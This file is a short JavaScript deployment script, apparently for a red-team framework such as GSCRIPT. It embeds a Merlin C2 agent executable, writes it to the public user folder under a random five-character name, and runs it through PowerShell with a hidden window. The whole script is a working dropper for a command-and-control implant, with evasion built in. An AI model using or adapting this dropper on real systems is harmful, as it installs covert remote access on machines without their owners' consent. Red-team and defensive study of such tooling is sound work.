// genesis script

//import:/private/tmp/merlinagent.exe

//priority:70
//timeout:75

var fn;

function BeforeDeploy() {
  return true; 
}

function Deploy() {
  var merl = Asset("merlinagent.exe");
  var name = "";
  var possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  for (var i = 0; i < 5; i++)
    name += possible.charAt(Math.floor(Math.random() * possible.length));
  fn = "C:\\Users\\Public\\" + name +".exe";
  WriteFile(fn, merl.fileData, 0755);
  ForkExecuteCommand("powershell", ["-NoLogo", "-WindowStyle", "hidden", fn]);
  return true;
}

function AfterDeploy() {
  return true;
}
